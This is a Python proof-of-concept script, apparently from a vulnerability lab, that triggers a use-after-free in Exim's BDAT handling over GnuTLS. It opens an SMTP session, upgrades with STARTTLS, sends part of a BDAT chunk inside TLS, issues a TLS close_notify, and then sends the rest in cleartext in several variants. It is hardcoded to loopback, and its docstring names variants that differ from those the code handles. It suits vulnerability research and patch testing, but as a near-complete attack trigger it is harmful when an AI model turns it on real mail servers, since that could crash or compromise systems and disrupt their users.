#!/usr/bin/env python3
"""Loopback-only Exim BDAT/GnuTLS close_notify trigger (CVE-2026-45185 lab).

Usage: python3 trigger.py PORT [VARIANT]
Variants:
  ungetc   - BDAT 5 with 1 TLS body byte, close_notify, then cleartext
             completing the chunk plus a CRLF header and a bare-LF header
             (drives receive_ungetc(' ') through the stale bdat/tls layer).
  cmd      - same but cleartext is an SMTP command line.
"""
import socket
import ssl
import sys
import time

PORT = int(sys.argv[1])
VARIANT = sys.argv[2] if len(sys.argv) > 2 else "ungetc"


def read_reply(s):
    data = b""
    while True:
        line = s.recv(4096)
        if not line:
            break
        data += line
        if b"\r\n" in data and (len(data) >= 4):
            lines = data.split(b"\r\n")
            # multiline: last line starts with digit + space or '-' final
            last = [x for x in lines if x][-1]
            if len(last) >= 4 and last[3:4] == b" ":
                break
    return data


def send_cmd(s, cmd, want=True):
    s.sendall(cmd + b"\r\n")
    r = read_reply(s) if want else b""
    print("  C: %r" % cmd)
    print("  S: %r" % r[:300])
    return r


def main():
    raw = socket.create_connection(("127.0.0.1", PORT), timeout=10)
    raw.settimeout(10)
    print("banner:", read_reply(raw)[:200])
    send_cmd(raw, b"EHLO trigger.local")
    send_cmd(raw, b"STARTTLS")
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    tls = ctx.wrap_socket(raw, server_hostname="localhost")
    tls.do_handshake()
    print("TLS:", tls.version(), tls.cipher()[0])
    send_cmd(tls, b"EHLO trigger.local")
    send_cmd(tls, b"MAIL FROM:<a@localhost>")
    send_cmd(tls, b"RCPT TO:<a@localhost>")
    bdat_cmd = (b"BDAT 100" if VARIANT == "four"
                else b"BDAT 2 LAST" if VARIANT in ("two", "three")
                else b"BDAT 5")
    send_cmd(tls, bdat_cmd, want=False)
    tls.sendall(b"A")       # 1 of n body bytes inside TLS
    tls.settimeout(1.0)
    try:
        clear = tls.unwrap()    # sends TLS close_notify, returns raw socket
    except (TimeoutError, socket.timeout):
        # Exim does not send a close_notify back with TLS_NO_SHUTDOWN;
        # the client alert was already written before SSL_shutdown waited.
        fd = tls.detach()
        clear = socket.socket(fileno=fd)
        print("unwrap timed out; continuing on detached fd", fd)
    clear.settimeout(10)
    if VARIANT == "four":
        # chunk still active: bare-LF header drives bdat_ungetc ->
        # stale lwr_receive_ungetc (tls_ungetc) after the free
        clear.sendall(b"A: 1\r\nB: 2\n")
        time.sleep(1.0)
    elif VARIANT == "three":
        clear.sendall(b"BBDAT 0 LAST\r\n")
        time.sleep(1.0)
        try:
            print("term reply:", clear.recv(4096)[:300])
        except Exception as e:
            print("term recv:", repr(e))
        send_cmd(clear, b"MAIL FROM:<b@localhost>")
        send_cmd(clear, b"RCPT TO:<b@localhost>")
        send_cmd(clear, b"DATA")
        clear.sendall(b"A: 1\r\nB: 2\r\nC: 3\n.\r\n")
        time.sleep(1.0)
    elif VARIANT == "two":
        clear.sendall(b"B")     # complete the BDAT LAST chunk
        time.sleep(0.5)
        send_cmd(clear, b"RSET")
        send_cmd(clear, b"MAIL FROM:<b@localhost>")
        send_cmd(clear, b"RCPT TO:<b@localhost>")
        send_cmd(clear, b"DATA")
        clear.sendall(b"Subject: x\r\nFrom: b\n")
    elif VARIANT == "ungetc":
        clear.sendall(b"BBBBSubject: x\r\nFrom: a\n")
    else:
        clear.sendall(b"BBBBQUIT\r\n")
    try:
        resp = clear.recv(4096)
        print("post-close reply:", resp[:300])
    except Exception as e:
        print("post-close recv:", repr(e))
    clear.close()


if __name__ == "__main__":
    main()
